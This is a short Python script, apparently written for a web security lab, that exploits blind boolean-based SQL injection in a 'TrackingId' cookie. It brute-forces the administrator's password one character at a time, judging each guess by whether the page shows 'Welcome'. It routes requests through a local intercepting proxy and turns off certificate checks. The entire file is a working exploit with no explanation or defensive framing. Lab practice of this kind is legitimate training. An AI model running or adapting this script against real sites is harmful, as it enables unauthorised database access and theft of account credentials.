import sys
import requests
import urllib, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password = ""
    for idx in range(1, 21):
        for ch in range(32, 126):
            payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (idx, ch)
            payload_encoded = urllib.parse.quote(payload)
            cookies = {'TrackingId': 'yIl8fYGEDF80rutK' + payload_encoded, 'session': 'rssvMlq0FjboKW8lbooG66xKRcfu6AtC'}
            res = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if 'Welcome' not in res.text:
                sys.stdout.write('\r' + password + chr(ch))
                sys.stdout.flush()
            else:
                password += chr(ch)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
    print('\n')

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("Example: %s www.example.com" % sys.argv[0])
        exit()
    url = sys.argv[1]
    print("[+] Retrieving administrator password...")
    sqli_password(url)

if __name__ == '__main__':
    main()